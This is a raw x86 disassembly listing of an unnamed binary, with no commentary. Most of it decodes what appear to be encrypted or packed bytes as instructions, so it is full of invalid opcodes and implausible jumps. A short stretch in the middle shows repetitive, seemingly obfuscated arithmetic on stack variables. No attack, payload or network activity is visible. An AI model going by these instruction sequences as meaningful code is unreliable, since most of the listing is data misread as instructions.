  421895:	xchg   BYTE PTR [esi-0x65],ah
  421898:	sti    
  421899:	fmul   QWORD PTR ds:0xae1b6830
  42189f:	mov    eax,0x5b00efbb
  4218a4:	pop    ecx
  4218a5:	jmp    0x3c49937f
  4218aa:	push   edx
  4218ab:	cmc    
  4218ac:	dec    ecx
  4218ad:	repnz cdq 
  4218af:	mov    ch,0x6c
  4218b1:	sub    ebx,esp
  4218b3:	ja     0x4218f8
  4218b5:	sub    edx,esi
  4218b7:	ret    0x7fde
  4218ba:	sbb    BYTE PTR [ecx],cl
  4218bc:	mov    eax,0x521f3dcc
  4218c1:	in     eax,0xa6
  4218c3:	stc    
  4218c4:	icebp  
  4218c5:	jmp    0xd17e:0x4e12409e
  4218cc:	mov    cl,0xb9
  4218ce:	fnstsw WORD PTR [ecx+0x37]
  4218d1:	enter  0xffb0,0xc3
  4218d5:	xor    al,0x17
  4218d7:	(bad)  
  4218d8:	push   esi
  4218d9:	jecxz  0x42190e
  4218db:	outs   dx,DWORD PTR ds:[esi]
  4218dc:	xchg   ecx,eax
  4218dd:	adc    bh,BYTE PTR [eax-0xfb3c91f]
  4218e3:	pop    ebx
  4218e4:	mov    eax,ds:0xb68baaf7
  4218e9:	or     al,0x1a
  4218eb:	lock lods al,BYTE PTR ds:[esi]
  4218ed:	sub    bl,BYTE PTR [edx+0x72]
  4218f0:	jno    0x4218cc
  4218f2:	leave  
  4218f3:	das    
  4218f4:	and    DWORD PTR [edx-0x2],edi
  4218f7:	push   esi
  4218f8:	rcl    edi,cl
  4218fa:	xor    al,0xf0
  4218fc:	inc    ebp
  4218fd:	imul   ecx,DWORD PTR [ecx+0x3f],0xffffff90
  421901:	sti    
  421902:	(bad)  [ecx+0x18487bea]
  421908:	(bad)  
  421909:	into   
  42190a:	pop    ebx
  42190b:	sbb    eax,0xafb9fa54
  421910:	lahf   
  421911:	add    edx,edi
  421913:	lahf   
  421914:	std    
  421915:	sub    BYTE PTR [esi],0x69
  421918:	jg     0x4218cb
  42191a:	push   ds
  42191b:	sub    ecx,DWORD PTR [ebx]
  42191d:	and    ah,BYTE PTR ds:0xf1e59594
  421923:	lods   al,BYTE PTR ds:[esi]
  421924:	xor    al,0x25
  421926:	pop    ss
  421927:	pop    esp
  421928:	jl     0x42191a
  42192a:	jno    0x421911
  42192c:	fisttp DWORD PTR [ecx+0x1bad11b5]
  421932:	jbe    0x421908
  421934:	dec    eax
  421935:	fistp  WORD PTR [eax+0x317b9d9d]
  42193b:	pushf  
  42193c:	aad    0xbc
  42193e:	mov    BYTE PTR [edx],cl
  421940:	push   ss
  421941:	mov    cl,0x5
  421943:	scas   al,BYTE PTR es:[edi]
  421944:	imul   DWORD PTR [edi-0x3d]
  421947:	imul   esi,DWORD PTR [edx+edx*1+0x81ebbc5],0x6a62ef49
  421952:	mov    esi,0xd61e71d7
  421957:	in     al,dx
  421958:	adc    al,0x72
  42195a:	pop    ebx
  42195b:	pop    ebx
  42195c:	and    BYTE PTR [edi+ebp*2-0x545dc1fc],0xd7
  421964:	jle    0x42196f
  421966:	icebp  
  421967:	sub    eax,0x3a0fc778
  42196c:	adc    esi,ecx
  42196e:	fwait
  42196f:	clc    
  421970:	and    dh,ch
  421972:	arpl   sp,sp
  421974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421975:	inc    eax
  421976:	adc    ebp,ebx
  421978:	in     al,dx
  421979:	mov    edx,0x7ef7f2a6
  42197e:	jbe    0x42193c
  421980:	cli    
  421981:	mov    edx,0x32231e66
  421986:	inc    esp
  421987:	cmp    DWORD PTR [edi],edi
  421989:	cld    
  42198a:	pop    edx
  42198b:	idiv   BYTE PTR [ebx+0x531d9aac]
  421991:	ret    
  421992:	push   ecx
  421993:	mov    edx,0x536559cd
  421998:	mov    bh,0x9a
  42199a:	ds fsub st,st(7)
  42199d:	(bad)  
  42199e:	sar    DWORD PTR [ecx-0x4e6b3031],cl
  4219a4:	mov    eax,0xf28fe236
  4219a9:	dec    ebx
  4219aa:	loope  0x421a22
  4219ac:	cmp    dh,BYTE PTR [eax-0x478d7586]
  4219b2:	adc    al,0xa
  4219b4:	xchg   edx,esi
  4219b6:	xchg   esp,eax
  4219b7:	sub    al,BYTE PTR [edx]
  4219b9:	jmp    0xc89f:0x25a933fb
  4219c0:	dec    ebp
  4219c1:	or     al,0x99
  4219c3:	in     al,dx
  4219c4:	mov    ebx,0x2ad2a0c2
  4219c9:	pop    esp
  4219ca:	cli    
  4219cb:	xor    ecx,ebx
  4219cd:	pop    esp
  4219ce:	scas   eax,DWORD PTR es:[edi]
  4219cf:	ds or  ah,ch
  4219d2:	int    0xd7
  4219d4:	lods   al,BYTE PTR gs:[esi]
  4219d6:	neg    ebx
  4219d8:	add    esp,DWORD PTR [edi-0x63]
  4219db:	lahf   
  4219dc:	xor    edx,DWORD PTR [edi]
  4219de:	sub    DWORD PTR [edi-0x5a],ebp
  4219e1:	xor    ecx,0x3d
  4219e4:	cmp    eax,DWORD PTR [edi]
  4219e6:	call   0xa92ecb8f
  4219eb:	xchg   ebp,eax
  4219ec:	cmp    bh,dh
  4219ee:	jmp    0x574cb3c2
  4219f3:	sub    eax,0x5b239b3b
  4219f8:	mov    ds:0xa2ddbbef,eax
  4219fd:	xchg   edx,eax
  4219fe:	in     al,0x5
  421a00:	xchg   edi,eax
  421a01:	and    al,0x62
  421a03:	outs   dx,DWORD PTR ds:[esi]
  421a04:	cs mov bl,0x48
  421a07:	outs   dx,DWORD PTR ds:[esi]
  421a08:	and    edx,DWORD PTR [ebp+0x6c]
  421a0b:	jbe    0x4219a6
  421a0d:	cmp    bh,0xe8
  421a10:	in     eax,0x95
  421a12:	out    dx,al
  421a13:	adc    DWORD PTR [esi+0x370163ac],ecx
  421a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a1a:	jno    0x4219f1
  421a1c:	pop    ds
  421a1d:	push   0xffffffec
  421a1f:	sub    al,0x2c
  421a21:	jae    0x4219e1
  421a23:	addr16 das 
  421a25:	xchg   esi,eax
  421a26:	xor    esp,ebx
  421a28:	scas   al,BYTE PTR es:[edi]
  421a29:	ds inc edi
  421a2b:	mov    esp,0xc48abce3
  421a30:	cld    
  421a31:	lea    esp,[eax+0x79f05c95]
  421a37:	ror    BYTE PTR [ecx+0x6d4a3e19],cl
  421a3d:	push   es
  421a3e:	aaa    
  421a3f:	dec    ecx
  421a40:	mov    ebx,0xfe22950c
  421a45:	add    bl,BYTE PTR [ecx-0x72]
  421a48:	not    DWORD PTR [esi-0x39286a16]
  421a4e:	aas    
  421a4f:	add    al,0x83
  421a51:	enter  0x4f21,0x23
  421a55:	in     eax,dx
  421a56:	inc    ebx
  421a57:	int3   
  421a58:	or     DWORD PTR ds:0x7d874204,edi
  421a5e:	and    ebp,DWORD PTR [edx-0x24]
  421a61:	cmp    DWORD PTR [edx+esi*4+0x3db253a4],eax
  421a68:	or     DWORD PTR [ebx+0x2],esi
  421a6b:	mov    eax,ds:0xb221bbbe
  421a70:	jnp    0x421a78
  421a72:	cdq    
  421a73:	rcl    edi,cl
  421a75:	(bad)  
  421a76:	leave  
  421a77:	ins    BYTE PTR es:[edi],dx
  421a78:	es mov bh,0x2a
  421a7b:	sahf   
  421a7c:	mov    eax,DWORD PTR [esi-0x5d]
  421a7f:	stc    
  421a80:	add    edx,ebx
  421a82:	mov    ds:0x898dd690,eax
  421a87:	in     al,dx
  421a88:	mov    ebp,0xdf1d0781
  421a8d:	lds    esi,FWORD PTR [ebx-0x7e2d38a6]
  421a93:	rcl    ebx,cl
  421a95:	jg     0x421a55
  421a97:	xor    al,0x90
  421a99:	jns    0x421a96
  421a9b:	jns    0x421aaf
  421a9d:	push   ebx
  421a9e:	daa    
  421a9f:	test   DWORD PTR [eax],ecx
  421aa1:	std    
  421aa2:	fnsave [esi-0x7d12fbcf]
  421aa8:	fwait
  421aa9:	mov    eax,ds:0xe500efcc
  421aae:	or     al,0xf2
  421ab0:	nop
  421ab1:	xor    esp,DWORD PTR [ecx]
  421ab3:	mov    ebp,DWORD PTR [ebp+0x8]
  421ab6:	enter  0x869f,0xd5
  421aba:	xor    BYTE PTR [ebx+0x91a21ef],0x6d
  421ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ac2:	pop    ebp
  421ac3:	and    DWORD PTR [ebp-0xc13778f],esp
  421ac9:	xor    BYTE PTR [edx],ah
  421acb:	push   ss
  421acc:	push   ebp
  421acd:	mov    ch,0x4c
  421acf:	int3   
  421ad0:	shl    DWORD PTR [esi-0x44],1
  421ad3:	test   eax,0x57d9f12e
  421ad8:	fld    DWORD PTR [edi+0x14]
  421adb:	mov    ds:0x2e427472,eax
  421ae0:	aaa    
  421ae1:	popf   
  421ae2:	xor    esp,eax
  421ae4:	jge    0x421ad7
  421ae6:	arpl   WORD PTR [ecx-0x26],si
  421ae9:	in     al,dx
  421aea:	fcom   QWORD PTR [ecx+0x370ac54c]
  421af0:	push   esi
  421af1:	or     ebx,edx
  421af3:	std    
  421af4:	adc    al,0xfd
  421af6:	(bad)  
  421af7:	fmul   DWORD PTR [edx+0xe6e7890]
  421afd:	outs   dx,DWORD PTR ds:[esi]
  421afe:	or     ch,BYTE PTR [eax-0x4e]
  421b01:	push   ecx
  421b02:	pop    edx
  421b03:	or     DWORD PTR [esi+ebp*4+0x388ba0e6],ebp
  421b0a:	popf   
  421b0b:	pop    ecx
  421b0c:	and    ch,0x65
  421b0f:	jae    0x421b06
  421b11:	call   0x78df:0x94c0d143
  421b18:	out    dx,al
  421b19:	shr    BYTE PTR [edi-0x118b6723],0x27
  421b20:	xchg   ebp,eax
  421b21:	jl     0x421b70
  421b23:	ja     0x421b98
  421b25:	jl     0x421b86
  421b27:	outs   dx,BYTE PTR ds:[esi]
  421b28:	mov    DWORD PTR [edx+0x6e5537b6],ecx
  421b2e:	ss in  al,dx
  421b30:	leave  
  421b31:	dec    esi
  421b32:	inc    ecx
  421b33:	in     eax,dx
  421b34:	push   0xd543d218
  421b39:	dec    ecx
  421b3a:	inc    ebp
  421b3b:	xchg   ebx,eax
  421b3c:	popf   
  421b3d:	je     0x421b85
  421b3f:	and    eax,0x7bf4fb03
  421b44:	add    BYTE PTR [ecx-0x7e],dh
  421b47:	dec    esi
  421b48:	(bad)  
  421b49:	cmp    bl,al
  421b4b:	in     eax,dx
  421b4c:	loope  0x421ad8
  421b4e:	stos   BYTE PTR es:[edi],al
  421b4f:	scas   eax,DWORD PTR es:[edi]
  421b50:	fiadd  DWORD PTR [edx]
  421b52:	shl    BYTE PTR [ecx+0x421ac7db],0x37
  421b59:	je     0x421b5b
  421b5b:	mov    ebx,edx
  421b5d:	xor    al,0x84
  421b5f:	in     eax,0x86
  421b61:	or     BYTE PTR [edi],dl
  421b63:	add    edx,ebp
  421b65:	(bad)  
  421b66:	xor    DWORD PTR [ecx],ecx
  421b68:	neg    BYTE PTR [edx-0x3a]
  421b6b:	mov    edi,0xf6c02d86
  421b70:	das    
  421b71:	sbb    ecx,0x56
  421b74:	add    BYTE PTR fs:[esi],dh
  421b77:	cmp    esi,edi
  421b79:	adc    bh,BYTE PTR [esi-0x547df833]
  421b7f:	mov    ds:0x26c0e955,al
  421b84:	fcomip st,st(2)
  421b86:	pop    es
  421b87:	inc    eax
  421b88:	push   esi
  421b89:	test   eax,0xcb5e4293
  421b8e:	pop    esi
  421b8f:	inc    edi
  421b90:	pop    edx
  421b91:	cs mov edx,0xa58e632b
  421b97:	cdq    
  421b98:	mov    eax,0xfca66da5
  421b9d:	stos   BYTE PTR es:[edi],al
  421b9e:	pusha  
  421b9f:	pushf  
  421ba0:	jmp    0xc27abbae
  421ba5:	xchg   ecx,eax
  421ba6:	lock icebp 
  421ba8:	jo     0x421b7e
  421baa:	das    
  421bab:	or     BYTE PTR [ebx],al
  421bad:	(bad)  
  421bae:	pop    esi
  421baf:	mov    eax,0xa2a5948d
  421bb4:	loopne 0x421c0a
  421bb6:	add    eax,DWORD PTR [eax-0x34]
  421bb9:	sub    ebp,DWORD PTR [eax+eax*4]
  421bbc:	adc    al,0x10
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	std    
  421bc0:	call   0xce5f0d81
  421bc5:	out    0xd6,eax
  421bc7:	fdiv   QWORD PTR [edx-0x158cfa1d]
  421bcd:	enter  0x8253,0x45
  421bd1:	dec    esp
  421bd2:	cmp    eax,0xe453fad3
  421bd7:	cwde   
  421bd8:	dec    ebx
  421bd9:	jae    0x421b77
  421bdb:	imul   esp,DWORD PTR [ecx+0x258ab2da],0x896a42ae
  421be5:	jbe    0x421bf0
  421be7:	and    DWORD PTR [ebx],0xfffffff8
  421bea:	pushf  
  421beb:	pop    ebp
  421bec:	retf   
  421bed:	out    0xb1,eax
  421bef:	mov    ah,0xb6
  421bf1:	cmp    ebp,DWORD PTR [edx-0x28c10d62]
  421bf7:	imul   ebx,esp,0x80aa3f1c
  421bfd:	or     eax,0xeebf9912
  421c02:	(bad)  
  421c04:	retf   0xce31
  421c07:	push   ebp
  421c08:	xor    al,BYTE PTR [ecx-0x2e]
  421c0b:	std    
  421c0c:	sub    cl,dh
  421c0e:	adc    DWORD PTR [ebx+0x1c],ebp
  421c11:	inc    edi
  421c12:	out    0xb8,eax
  421c14:	xor    BYTE PTR [esi],bl
  421c16:	pusha  
  421c17:	shl    BYTE PTR [edx+0x55],0x7a
  421c1b:	out    0x8d,eax
  421c1d:	jne    0x421c70
  421c1f:	int    0xf9
  421c21:	cmp    DWORD PTR [esi+edi*1],esp
  421c24:	jns    0x421c03
  421c26:	jb     0x421bac
  421c28:	mov    WORD PTR [ebx+0x31],gs
  421c2b:	and    BYTE PTR [esi-0x65e2e816],0xeb
  421c32:	or     ebx,edi
  421c34:	hlt    
  421c35:	mov    dl,0xc7
  421c37:	stos   DWORD PTR es:[edi],eax
  421c38:	adc    DWORD PTR ds:0xd6b54e95,0xb7538f7c
  421c42:	mov    ecx,0x13a7c3b2
  421c47:	sahf   
  421c48:	(bad)  
  421c49:	ins    BYTE PTR es:[edi],dx
  421c4a:	idiv   BYTE PTR [ebp-0x5a]
  421c4d:	enter  0x347e,0x68
  421c51:	inc    ebp
  421c52:	push   cs
  421c53:	shr    DWORD PTR [edx-0x1865bd5c],1
  421c59:	scas   eax,DWORD PTR es:[edi]
  421c5a:	enter  0x3f26,0x50
  421c5e:	pop    ebx
  421c5f:	hlt    
  421c60:	jecxz  0x421c54
  421c62:	inc    esp
  421c63:	loop   0x421caa
  421c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c66:	sub    bh,BYTE PTR [esi+edx*8]
  421c69:	sub    al,0x1e
  421c6b:	out    dx,eax
  421c6c:	aad    0x59
  421c6e:	ror    BYTE PTR [esi],1
  421c70:	iret   
  421c71:	and    ebp,DWORD PTR [eax-0x6cc3cc90]
  421c77:	lahf   
  421c78:	(bad)  
  421c79:	cmp    cl,BYTE PTR [ebx+esi*1]
  421c7c:	leave  
  421c7d:	(bad)  
  421c7e:	aas    
  421c7f:	icebp  
  421c80:	xchg   ebp,eax
  421c81:	xchg   ecx,eax
  421c82:	pusha  
  421c83:	and    esp,DWORD PTR [ebp-0x1877a36c]
  421c89:	xor    DWORD PTR [ebp+0x4aac9aa6],edi
  421c8f:	push   es
  421c90:	inc    ecx
  421c91:	div    sp
  421c94:	dec    ebp
  421c95:	add    DWORD PTR [ecx],ebx
  421c97:	cmp    eax,DWORD PTR [ecx+0x77]
  421c9a:	adc    eax,0x58536e45
  421c9f:	mov    ebx,0x1c8eaa73
  421ca4:	dec    ebp
  421ca5:	test   DWORD PTR [edx-0xfc82c33],0xc2be6b78
  421caf:	dec    eax
  421cb0:	call   0x4f9a:0x8382e246
  421cb7:	sub    dh,cl
  421cb9:	cmp    cl,BYTE PTR [eax-0x42]
  421cbc:	addr16 xchg edx,eax
  421cbe:	inc    edx
  421cbf:	leave  
  421cc0:	shr    BYTE PTR [edx+eiz*1-0x5663823a],1
  421cc7:	mov    BYTE PTR [eax],dh
  421cc9:	mov    ah,BYTE PTR [eax-0x180f3da6]
  421ccf:	test   eax,edi
  421cd1:	dec    esi
  421cd2:	and    DWORD PTR [esi+0x135a9226],esi
  421cd8:	sbb    DWORD PTR [esi-0x1a13177a],ebp
  421cde:	addr16 mov ds:0x8aa,eax
  421ce2:	inc    ecx
  421ce3:	aam    0xde
  421ce5:	xchg   BYTE PTR [ebp+0x5b98b6aa],al
  421ceb:	enter  0xf3e1,0xa5
  421cef:	lea    ecx,[edi+0x7db82cba]
  421cf5:	loopne 0x421d0d
  421cf7:	(bad)  
  421cf8:	test   DWORD PTR [ebx],eax
  421cfa:	mov    fs,ebp
  421cfc:	mov    BYTE PTR [ecx],ch
  421cfe:	mov    ds:0x473387b7,eax
  421d03:	inc    edi
  421d04:	fst    QWORD PTR [edi]
  421d06:	das    
  421d07:	push   esp
  421d08:	lds    edi,FWORD PTR [edx+ecx*1-0x29]
  421d0c:	cmp    eax,0x2287cba5
  421d11:	out    dx,al
  421d12:	push   eax
  421d13:	xor    ebx,esi
  421d15:	lahf   
  421d16:	ds mov ds,edi
  421d19:	xlat   BYTE PTR ds:[ebx]
  421d1a:	xchg   ebx,eax
  421d1b:	rcl    DWORD PTR [ebx+ebx*8+0x60],cl
  421d1f:	icebp  
  421d20:	sub    ebp,0x61
  421d23:	and    dl,BYTE PTR [ebp-0x5a]
  421d26:	sub    BYTE PTR [eax+0x610fa5f2],dh
  421d2c:	orps   xmm1,XMMWORD PTR [ebx+esi*8+0x2]
  421d31:	lea    ebp,ds:0x6e19cfd7
  421d37:	inc    ecx
  421d38:	inc    ebx
  421d39:	lods   al,BYTE PTR ds:[esi]
  421d3a:	inc    ecx
  421d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d3c:	dec    ecx
  421d3d:	fadd   DWORD PTR [eax+edx*4+0x5677a356]
  421d44:	xchg   ecx,eax
  421d45:	sbb    eax,edx
  421d47:	fwait
  421d48:	rcr    BYTE PTR [esi+0x658251b7],cl
  421d4e:	mov    ah,0x7c
  421d50:	xchg   dl,ch
  421d52:	push   edx
  421d53:	popa   
  421d54:	(bad)  [edx]
  421d56:	shl    BYTE PTR [esi+0x28],cl
  421d59:	arpl   WORD PTR [edi+ebp*4+0x7770b7ab],cx
  421d60:	ins    DWORD PTR es:[edi],dx
  421d61:	test   DWORD PTR [edx-0x3c],edx
  421d64:	and    ch,dh
  421d66:	ror    DWORD PTR [edx+0x6c],0x79
  421d6a:	popf   
  421d6b:	(bad)
  421d6e:	mov    esi,0x8b285541
  421d73:	or     DWORD PTR [esi+0x38],edi
  421d76:	outs   dx,DWORD PTR ds:[esi]
  421d77:	dec    esp
  421d78:	js     0x421d9e
  421d7a:	or     al,0xe3
  421d7c:	push   esi
  421d7d:	pop    eax
  421d7e:	(bad)  
  421d7f:	mov    ebx,0x7d38e108
  421d84:	aas    
  421d85:	out    0xaa,eax
  421d87:	cli    
  421d88:	sahf   
  421d89:	je     0x421d8b
  421d8b:	add    BYTE PTR [edx-0x26dccadd],ah
  421d91:	or     al,0x61
  421d93:	fisubr WORD PTR [ebx+0x7c]
  421d96:	pop    edi
  421d97:	add    BYTE PTR ds:0x74fc58fc,dl
  421d9d:	push   ebx
  421d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d9f:	jne    0x421db4
  421da1:	inc    edx
  421da2:	dec    ecx
  421da3:	inc    ecx
  421da4:	data16 scas al,BYTE PTR es:[edi]
  421da6:	jnp    0x421e0d
  421da8:	into   
  421da9:	and    DWORD PTR [edi],esi
  421dab:	jmp    0xbf7bcabf
  421db0:	sbb    ch,BYTE PTR [ecx]
  421db2:	push   DWORD PTR [edi-0x8efa7d9]
  421db8:	arpl   dx,bx
  421dba:	dec    ebx
  421dbb:	mov    ds:0x1ddb1f43,al
  421dc0:	(bad)  
  421dc1:	out    0x6d,eax
  421dc3:	popf   
  421dc4:	ret    0xd32b
  421dc7:	test   al,0x33
  421dc9:	mov    esi,0xb24cbe5b
  421dce:	lahf   
  421dcf:	popa   
  421dd0:	daa    
  421dd1:	aam    0xaa
  421dd3:	pop    edx
  421dd4:	xor    DWORD PTR [edi+0x41],0x6f293fd3
  421ddb:	or     DWORD PTR [ebx],0xffffffa4
  421dde:	(bad)  
  421de0:	bound  esi,QWORD PTR [esi+0x50]
  421de3:	xor    ebp,0x602e6874
  421de9:	cmp    ah,BYTE PTR [edx-0x18]
  421dec:	pop    edi
  421ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dee:	jnp    0x421e0e
  421df0:	xchg   esp,eax
  421df1:	shr    DWORD PTR [edx],0xa2
  421df4:	mov    ds:0xdfb2de,al
  421df9:	cmc    
  421dfa:	and    BYTE PTR [esi+0x3c],ah
  421dfd:	jae    0x421dd8
  421dff:	mov    bl,0x3f
  421e01:	repz xor DWORD PTR [edx+0x6a],ebx
  421e05:	(bad)  
  421e06:	mov    edx,DWORD PTR [esi+0x78cf3e2d]
  421e0c:	push   0x6a67aa42
  421e11:	jle    0x421e79
  421e13:	mov    eax,ds:0xd92d11b0
  421e18:	(bad)  
  421e19:	leave  
  421e1a:	mov    ebx,DWORD PTR [eax+0x3119c49e]
  421e20:	add    dl,BYTE PTR [edx-0x10fd622a]
  421e26:	jae    0x421e2f
  421e28:	adc    DWORD PTR [eax+eax*8+0x53382270],edx
  421e2f:	sbb    BYTE PTR [ebp-0x389517e1],dh
  421e35:	or     al,0x35
  421e37:	push   ss
  421e38:	mov    ds:0xd766edc4,eax
  421e3d:	jns    0x421e6a
  421e3f:	jle    0x421deb
  421e41:	sti    
  421e42:	aaa    
  421e43:	das    
  421e44:	out    0xc0,eax
  421e46:	push   ecx
  421e47:	nop
  421e48:	xchg   BYTE PTR [ebx+0x5589f33b],dl
  421e4e:	hlt    
  421e4f:	mov    edx,DWORD PTR [ebp-0x10]
  421e52:	xor    edx,eax
  421e54:	add    edx,esi
  421e56:	jne    0x41d43b
  421e5c:	jmp    0x4230d8
  421e61:	mov    ecx,DWORD PTR [ebp-0x14]
  421e64:	mov    DWORD PTR [ebp+0x8],ecx
  421e67:	jmp    0x421ee0
  421e6c:	mov    ecx,DWORD PTR [ebp+0x8]
  421e6f:	mov    edx,DWORD PTR [ebp-0x8]
  421e72:	xor    ecx,eax
  421e74:	xor    edx,eax
  421e76:	sub    ecx,edx
  421e78:	sub    ecx,esi
  421e7a:	xor    ecx,eax
  421e7c:	mov    DWORD PTR [ebp+0x8],ecx
  421e7f:	mov    ecx,DWORD PTR [ebp+0x8]
  421e82:	mov    edx,DWORD PTR [ebp-0x58]
  421e85:	add    ecx,0x5708fa
  421e8b:	imul   ecx,edx
  421e8e:	mov    DWORD PTR [ebp-0x58],ecx
  421e91:	mov    ecx,DWORD PTR [ebp+0x8]
  421e94:	mov    edx,DWORD PTR [ebp-0x54]
  421e97:	add    ecx,0x64f898
  421e9d:	or     ecx,edx
  421e9f:	mov    DWORD PTR [ebp-0x54],ecx
  421ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ea5:	mov    edx,DWORD PTR [ebp-0x50]
  421ea8:	add    ecx,0x242ebc9
  421eae:	xor    ecx,edx
  421eb0:	mov    DWORD PTR [ebp-0x50],ecx
  421eb3:	mov    ecx,DWORD PTR [ebp+0x8]
  421eb6:	mov    edx,DWORD PTR [ebp-0x4c]
  421eb9:	add    ecx,edi
  421ebb:	and    ecx,edx
  421ebd:	mov    DWORD PTR [ebp-0x4c],ecx
  421ec0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ec3:	mov    edx,DWORD PTR [ebp-0x48]
  421ec6:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421ecd:	mov    DWORD PTR [ebp-0x48],ecx
  421ed0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ed3:	mov    edx,0xfa5e1524
  421ed8:	sub    edx,ecx
  421eda:	add    edx,DWORD PTR [ebp-0x44]
  421edd:	mov    DWORD PTR [ebp-0x44],edx
  421ee0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ee3:	xor    ecx,eax
  421ee5:	add    ecx,esi
  421ee7:	jne    0x421e6c
  421eed:	jmp    0x4230e4
  421ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ef5:	mov    edx,DWORD PTR [ebp-0x8]
  421ef8:	xor    ecx,eax
  421efa:	xor    edx,eax
  421efc:	sub    ecx,edx
  421efe:	sub    ecx,esi
  421f00:	xor    ecx,eax
  421f02:	mov    DWORD PTR [ebp+0x8],ecx
  421f05:	mov    ecx,DWORD PTR [ebp+0x8]
  421f08:	mov    edx,DWORD PTR [ebp-0x58]
  421f0b:	add    ecx,0x5708fa
  421f11:	imul   ecx,edx
  421f14:	mov    DWORD PTR [ebp-0x58],ecx
  421f17:	mov    ecx,DWORD PTR [ebp+0x8]
  421f1a:	mov    edx,DWORD PTR [ebp-0x54]
  421f1d:	add    ecx,0x64f898
  421f23:	or     ecx,edx
  421f25:	mov    DWORD PTR [ebp-0x54],ecx
  421f28:	mov    ecx,DWORD PTR [ebp+0x8]
  421f2b:	mov    edx,DWORD PTR [ebp-0x50]
  421f2e:	add    ecx,0x242ebc9
  421f34:	xor    ecx,edx
  421f36:	mov    DWORD PTR [ebp-0x50],ecx
  421f39:	mov    ecx,DWORD PTR [ebp+0x8]
  421f3c:	mov    edx,DWORD PTR [ebp-0x4c]
  421f3f:	jmp    0x4230a4
  421f44:	sbb    eax,0x95d463fb
  421f49:	aam    0x96
  421f4b:	mov    dh,0xbf
  421f4d:	cdq    
  421f4e:	push   eax
  421f4f:	inc    esi
  421f50:	pop    esp
  421f51:	sahf   
  421f52:	push   edi
  421f53:	(bad)  
  421f54:	fist   DWORD PTR [ecx+0x6c3b837c]
  421f5a:	add    DWORD PTR [ebx+0x283f9de6],0x32
  421f61:	mov    ds:0xf989baf0,eax
  421f66:	push   0x79
  421f68:	xchg   ebx,eax
  421f69:	int    0xa6
  421f6b:	mov    dh,0xd2
  421f6d:	pop    ebp
  421f6e:	enter  0x4404,0x6c
  421f72:	outs   dx,DWORD PTR ds:[esi]
  421f73:	add    ah,BYTE PTR [edx-0x56]
  421f76:	xor    DWORD PTR [ecx],edi
  421f78:	rcr    DWORD PTR ds:0xb3076f95,1
  421f7e:	sbb    ch,BYTE PTR [eax]
  421f80:	mov    esp,0xa77276ac
  421f85:	(bad)  
  421f86:	ins    BYTE PTR es:[edi],dx
  421f87:	ficom  WORD PTR fs:[eax-0x5cf879e7]
  421f8e:	add    dh,0x57
  421f91:	add    esp,edi
  421f93:	jmp    0x83e43166
  421f98:	mov    dl,0xf
  421f9a:	loope  0x421f6c
  421f9c:	jle    0x421fe3
  421f9e:	fisubr DWORD PTR [ebx-0x52]
  421fa1:	push   0xffffffd8
  421fa3:	dec    edx
  421fa4:	cmp    al,0xff
  421fa6:	push   0x30a6c611
  421fab:	dec    ebp
  421fac:	mov    ebx,0x4ee2060c
  421fb1:	pop    ebx
  421fb2:	arpl   bx,dx
  421fb4:	pop    ebx
  421fb5:	jl     0x421f48
  421fb7:	(bad)  
  421fb8:	jg     0x42200d
  421fba:	test   eax,0xf817d0ed
  421fbf:	js     0x421fd3
  421fc1:	ja     0x422041
  421fc3:	loope  0x421f70
  421fc5:	in     al,0xca
  421fc7:	cmp    al,0xf3
  421fc9:	mov    ds:0x7861301,al
  421fce:	xchg   DWORD PTR [ebx+0x5a],ecx
  421fd1:	lock sbb DWORD PTR [ebx],0xffffff87
  421fd5:	cwde   
  421fd6:	mov    ds:0x772d17d2,al
  421fdb:	and    BYTE PTR [esi+0x60265608],al
  421fe1:	xor    al,0x5f
  421fe3:	test   al,0x1c
  421fe5:	popf   
  421fe6:	or     BYTE PTR [ecx+0x3564f44f],0x44
  421fed:	pop    esi
  421fee:	pop    eax
  421fef:	enter  0x485c,0x83
  421ff3:	sub    ecx,esp
  421ff5:	sbb    BYTE PTR [ebx+eax*2+0x2b],0x67
  421ffa:	int3   
  421ffb:	scas   al,BYTE PTR es:[edi]
  421ffc:	sbb    cl,al
  421ffe:	scas   al,BYTE PTR es:[edi]
  421fff:	xlat   BYTE PTR ds:[ebx]
  422000:	add    BYTE PTR [ecx],ch
  422002:	std    
  422003:	sub    eax,0xa98dd541
  422008:	sub    eax,0xd5d09ec3
  42200d:	xlat   BYTE PTR ds:[ebx]
  42200e:	xor    DWORD PTR [ebx-0x2f],0xea63c8a7
  422015:	aaa    
  422016:	jg     0x422066
  422018:	daa    
  422019:	or     DWORD PTR [edi+0x9],edx
  42201c:	dec    ebx
  42201d:	es xor ebp,eax
  422020:	push   edi
  422021:	inc    BYTE PTR [esp+edx*4]
  422024:	ins    DWORD PTR es:[edi],dx
  422025:	push   0xffffffd8
  422027:	mov    al,ds:0x6dbd5732
  42202c:	ss clc 
  42202e:	leave  
  42202f:	cmp    ebx,edi
  422031:	lock fcmovnbe st,st(4)
  422034:	inc    ecx
  422035:	call   DWORD PTR [edi-0x25]
  422038:	mov    cl,0xb3
  42203a:	rcl    DWORD PTR [ebx+0x4461cf32],cl
  422040:	in     eax,0x75
  422042:	(bad)  
  422043:	nop
  422044:	sar    BYTE PTR [ecx+0x4a3170b],0xef
  42204b:	mov    esp,0x5b63e69c
  422050:	sti    
  422051:	xchg   ebx,eax
  422052:	dec    DWORD PTR [eax-0x7598f22a]
  422058:	xchg   esp,eax
  422059:	aad    0x90
  42205b:	loopne 0x4220af
  42205d:	(bad)  
  42205e:	sbb    dh,BYTE PTR [eax-0x4b1a3584]
  422064:	jne    0x42200c
  422066:	dec    edi
  422067:	aam    0xda
  422069:	retf   
  42206a:	adc    eax,0xf5d4695b
